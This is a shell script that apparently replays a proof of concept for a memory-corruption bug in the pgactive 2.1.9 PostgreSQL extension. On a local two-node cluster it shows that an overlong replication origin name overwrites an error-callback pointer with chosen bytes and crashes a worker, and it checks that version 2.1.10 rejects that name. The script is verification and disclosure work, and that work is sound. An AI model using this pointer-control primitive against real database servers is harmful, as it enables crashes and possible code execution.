#!/bin/sh
# One-command replay of the live error-callback pointer-control arm.
# Loopback-only; no external target. Author-side smoke test, not a verdict.
set -u
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
REPO=$(git -C "$HERE" rev-parse --show-toplevel) || exit 1
T=$(mktemp -d /tmp/pgactive-callback-witness.XXXXXX) || exit 1
V219=3177a37cd16c0010e5973190b4bbe31287144849823752865a5c8fb9ee162998
V2210=986917a8656c4d099659a148cb077570e233b8d358273354f06b06f57ab2885a
SRCDIR=/tmp/pgactive-full-219/pgactive-2.1.9
SRCFILE=$SRCDIR/src/pgactive_catalogs.c
LIBDIR=/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/lib
V219SO=$SRCDIR/pgactive.so.v219-installed
PGBIN=/tmp/pgactive-build/pg16root/usr/lib/postgresql/16/bin
D=$T/lab/frontier/pgactive2shell/realbuild/twonode
PATCHED=$D/callbackreach/pgactive_catalogs.c

cleanup() {
  for N in 1 2; do
    [ -f "$D/n$N/postmaster.pid" ] &&
      "$PGBIN/pg_ctl" -D "$D/n$N" -m immediate -w stop >/dev/null 2>&1
  done
  [ -f "$T/orig-catalogs.c" ] && cp "$T/orig-catalogs.c" "$SRCFILE" 2>/dev/null
  [ -f "$T/orig-v219.so" ] && cp "$T/orig-v219.so" "$V219SO" 2>/dev/null
  cp "$V219SO" "$LIBDIR/pgactive.so" 2>/dev/null || true
}
trap cleanup EXIT

# Clear lane-owned ports left by an aborted earlier run.
for PID in $(ps -eo pid,args | grep -E 'postgres -D n[12] -p 5843[12]' |
             grep -v grep | awk '{print $1}'); do
  kill -QUIT "$PID" 2>/dev/null || true
done

ORIGSRC=$(sha256sum "$SRCFILE" 2>/dev/null | cut -d' ' -f1)
ORIGLIB=$(sha256sum "$V219SO" 2>/dev/null | cut -d' ' -f1)
[ "$ORIGSRC" = e844c18b743cd6173826f7d28025c80e155c404b896a8643c3ead23dda0e5563 ] || {
  printf 'PREREQ_FAIL: pinned parser source hash %s\n' "$ORIGSRC"; exit 1; }
[ "$ORIGLIB" = "$V219" ] || {
  printf 'PREREQ_FAIL: installed 2.1.9 hash %s\n' "$ORIGLIB"; exit 1; }
[ -f "$PGBIN/pg_ctl" ] || { printf 'PREREQ_FAIL: no PG16 root\n'; exit 1; }

git -C "$REPO" archive HEAD lab/frontier/pgactive2shell/realbuild/twonode \
  | tar x -C "$T" || exit 1
cp "$SRCFILE" "$T/orig-catalogs.c"
cp "$V219SO" "$T/orig-v219.so"

FAIL=0
need() { # label file term...
  L=$1; F=$2; shift 2
  for TERM in "$@"; do
    grep -q "$TERM" "$F" 2>/dev/null || {
      printf 'MISSING %s: %s\n' "$L" "$TERM"; FAIL=$((FAIL + 1)); }
  done
}
marker() { # key expected
  V=$(cat "$D/evidence/$1.txt" 2>/dev/null); V=${V#$1=}
  printf ' %s=%s' "$1" "${V:-?}"
  [ "${V:-?}" = "$2" ] || FAIL=$((FAIL + 1))
}
terms() { # label expected1 expected2
  T1=$(cat "$D/evidence/TERMINATIONS1.txt" 2>/dev/null); T1=${T1#TERMINATIONS1=}
  T2=$(cat "$D/evidence/TERMINATIONS2.txt" 2>/dev/null); T2=${T2#TERMINATIONS2=}
  printf '  %s TERMINATIONS1=%s TERMINATIONS2=%s\n' "$1" "${T1:-?}" "${T2:-?}"
  [ "${T1:-?}" = "$2" ] && [ "${T2:-?}" = "$3" ] || FAIL=$((FAIL + 1))
}

build_instrumented() {
  cp "$PATCHED" "$SRCFILE"
  ( cd "$SRCDIR" && make clean >"$T/$1-clean.log" 2>&1 &&
    make pgactive.so with_llvm=no \
      CFLAGS='-O1 -g -fPIC -fno-omit-frame-pointer' \
      EXTRA_CFLAGS='-I/usr/include/postgresql -I/usr/include/postgresql/internal -I/tmp/pgactive-build/pg16root/usr/include' \
      >"$T/$1-build.log" 2>&1 ) || return 1
  cp "$SRCDIR/pgactive.so" "$V219SO"
  cp "$T/orig-catalogs.c" "$SRCFILE"
}


terms_ge() { # label expected1 min2
  T1=$(cat "$D/evidence/TERMINATIONS1.txt" 2>/dev/null); T1=${T1#TERMINATIONS1=}
  T2=$(cat "$D/evidence/TERMINATIONS2.txt" 2>/dev/null); T2=${T2#TERMINATIONS2=}
  printf '  %s TERMINATIONS1=%s TERMINATIONS2=%s (min %s)\n' \
    "$1" "${T1:-?}" "${T2:-?}" "$3"
  { [ "${T1:-?}" = "$2" ] && [ "${T2:-?}" -ge "$3" ]; } 2>/dev/null ||
    FAIL=$((FAIL + 1))
}
run_arm() { # label want-sha payload version
  L=$1; WANT=$2; PAYLOAD=$3; VERSION=$4
  OUT="$T/$L.out"
  ( cd "$D" && env VERSION="$VERSION" NO_HANDLER=1 ORIGIN_TUPLE=1 \
      ORIGIN_PAYLOAD_LEN="$PAYLOAD" sh run-two.sh ) >"$OUT" 2>&1
  RC=$?
  USED=$(cut -d' ' -f1 /tmp/twonode-used-sha.txt 2>/dev/null)
  cp -R "$D/evidence" "$T/$L-evidence" 2>/dev/null || true
  cat "$D/evidence/server1.log" "$D/evidence/server2.log" >"$T/$L-server.log" 2>/dev/null
  printf '%s RC=%s LIB_OK=%s PAYLOAD=%s' "$L" "$RC" \
    "$([ "$USED" = "$WANT" ] && echo 1 || echo 0)" "$PAYLOAD"
  [ "$RC" -eq 0 ] || FAIL=$((FAIL + 1))
  [ "$USED" = "$WANT" ] || FAIL=$((FAIL + 1))
  marker CREATE_GROUP 0
  marker NODE1_READY r
  marker NODE2_READY r
  marker TUPLE_ORIGIN_INSERT 0
  marker TABLE_ON_NODE2 t
  marker PGSTOP1 0
  V=$(cat "$D/evidence/PGSTOP2.txt" 2>/dev/null); V=${V#PGSTOP2=}
  printf ' PGSTOP2=%s (observed)\n' "${V:-?}"
}

# 1. Instrumented 2.1.9, original 275-byte name: callback found, not reached
#    by the write; chosen bytes cannot touch it and no worker dies.
build_instrumented short || { printf 'BUILD_FAIL short\n'; exit 1; }
SHORT_SHA=$(sha256sum "$SRCDIR/pgactive.so" | cut -d' ' -f1)
printf 'INSTRUMENTED_SHA=%s\n' "$SHORT_SHA"
run_arm v219-short "$SHORT_SHA" 130 2.1.9
need v219-short "$T/v219-short-server.log" 'CBREACH' 'delta=464' \
  'could not parse slot name'
terms v219-short 0 0
if grep -q 'fn=0x5a415a415a415a41' "$T/v219-short-server.log" 2>/dev/null; then
  printf 'MISSING v219-short: callback already corrupted\n'; FAIL=$((FAIL + 1))
fi

# 2. Same instrumented build, 616-byte name: chosen bytes land in callback,
#    arg and previous; the error path dereferences the corrupted callback.
run_arm v219-long "$SHORT_SHA" 600 2.1.9
need v219-long "$T/v219-long-server.log" \
  'CBREACH' 'delta=464' 'fn=0x5a415a415a415a41' \
  'arg=0x5a415a415a415a41' 'prev=0x5a415a415a415a41' \
  'terminated by signal 11'
terms_ge v219-long 0 1

# 3. Restore pinned 2.1.9, then genuine fixed 2.1.10 with the same long name:
#    parser rejects it cleanly and no callback is dereferenced.
cp "$T/orig-v219.so" "$V219SO"
run_arm v2210-fixed "$V2210" 600 2.1.10
need v2210-fixed "$T/v2210-fixed-server.log" \
  'could not parse replication origin name'
terms v2210-fixed 0 0
if grep -q 'CBREACH\|terminated by signal 11' "$T/v2210-fixed-server.log" 2>/dev/null; then
  printf 'MISSING v2210-fixed: unexpected callback corruption or crash\n'
  FAIL=$((FAIL + 1))
fi

LEFT=$(ps -eo pid,args | grep -E 'postgres -D n[12] -p 5843[12]' |
       grep -v grep | wc -l)
printf 'LEFTOVER_POSTMASTERS=%s\n' "$LEFT"
[ "$LEFT" -eq 0 ] || FAIL=$((FAIL + 1))
RESTORED=$(sha256sum "$V219SO" 2>/dev/null | cut -d' ' -f1)
printf 'RESTORED_LIB_OK=%s\n' "$([ "$RESTORED" = "$V219" ] && echo 1 || echo 0)"
[ "$RESTORED" = "$V219" ] || FAIL=$((FAIL + 1))
SRCDONE=$(sha256sum "$SRCFILE" 2>/dev/null | cut -d' ' -f1)
printf 'RESTORED_SRC_OK=%s\n' "$([ "$SRCDONE" = "$ORIGSRC" ] && echo 1 || echo 0)"
[ "$SRCDONE" = "$ORIGSRC" ] || FAIL=$((FAIL + 1))
printf 'VERDICT=%s FAILURES=%s ROOT=%s\n' \
  "$([ "$FAIL" -eq 0 ] && echo PASS || echo FAIL)" "$FAIL" "$T"
exit "$FAIL"
